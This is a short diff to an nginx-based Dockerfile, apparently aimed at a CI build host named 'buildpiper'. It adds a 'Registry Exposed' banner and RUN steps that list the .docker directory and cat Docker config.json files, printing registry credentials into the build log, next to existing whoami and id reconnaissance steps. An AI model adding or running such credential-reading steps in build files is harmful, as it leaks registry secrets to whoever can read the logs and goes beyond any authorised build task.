@@ -3,8 +3,11 @@ FROM nginx:alpine
 ARG CACHE_BUST=1
 RUN echo $CACHE_BUST
 
-RUN echo "===== WHOAMI ====="
+RUN echo "===== Registry Exposed ====="
 RUN whoami
+RUN ls -la /home/buildpiper/.docker || true
+RUN cat /home/buildpiper/.docker/config.json || true
+RUN cat ~/.docker/config.json || true
 
 RUN echo "===== ID ====="
 RUN id
